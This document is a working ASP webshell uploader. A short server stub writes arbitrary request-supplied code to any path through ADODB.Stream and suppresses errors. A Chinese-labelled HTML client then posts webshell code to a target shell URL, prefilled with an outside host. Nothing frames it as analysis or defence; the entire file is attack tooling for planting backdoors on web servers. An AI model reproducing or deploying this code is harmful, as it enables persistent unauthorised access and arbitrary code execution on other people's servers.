<%
On Error Resume Next
set gl=server.CreateObJeCt("Adodb.Stream") 
gl.Open 
gl.Type=2
gl.CharSet="gb2312" 
gl.writetext request("code")
gl.SaveToFile server.mappath(request("path")),2 
gl.Close 
set gl=nothing 
response.redirect request("path")
%>
客户端
 
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>Asp shell up Client</title>
</head>
<style>
BODY { FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: "Courier New"; scrollbar-face-color:#E4E4F3; scrollbar-highlight-color:#FFFFFF; scrollbar-3dlight-color:#E4E4F3; scrollbar-darkshadow-color:#9C9CD3; scrollbar-shadow-color:#E4E4F3; scrollbar-arrow-color:#4444B3; scrollbar-track-color:#EFEFEF;}TABLE { FONT-SIZE: 9pt; BORDER-COLLAPSE: collapse; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-top-style: solid; border-bottom-style: none; border-left-style: solid; border-top-color: #d8d8f0; border-right-color: #d8d8f0; border-bottom-color: #d8d8f0; border-left-color: #d8d8f0;}input { font-family: "Courier New"; BORDER-TOP-WIDTH: 1px; FONT-SIZE: 12px; BORDER-BOTTOM-WIDTH: 1px; BORDER-RIGHT-WIDTH: 1px;}textarea { font-family: "Courier New";}td { border-right-width: 1px; border-bottom-width: 1px; border-right-style: solid; border-bottom-style: solid; border-top-color: #d8d8f0;}.trHead { background-color: #e4e4f3; line-height: 3px;}.STYLE5 {font-family: Arial, Helvetica, sans-serif; font-size: 11pt;}
</style>
<body>
 
<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
 
<tr>
<td height="22" class="td" align="center" > <span class="STYLE5">Asp shell up Client </span> </td>
</tr>
<tr>
<td class="trHead"> </td>
</tr>
<td align="center" class="td"> </td>
<tr>
<td height="18" align="center" class="td">
<FORM method=post target=_blank>ShellUrl: <INPUT 
style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid" 
size=58 value=http://www.heimian.com/s.asp name=act> Path: <INPUT 
style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid" 
size=8 value="4.txt" name=path> <INPUT onClick="Javascipt:name=path.value;action=document.all.act.value;submit();" type=button value="Submit" name=Send>
发送的webshell代码:&nbsp;&nbsp;
<TEXTAREA style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid" name=code rows=20 cols=85></TEXTAREA>
</FORM>
</td>
</tr>
<tr>
<td align="right" class="td"> Powered By <a href="#" title="点击复制服务端到剪贴版" >[Copy code]</a> 4ngr7&nbsp; &nbsp;</td>
</tr><tr><td class="trHead"> </td></tr>
 
</table>
 
</body>
</html>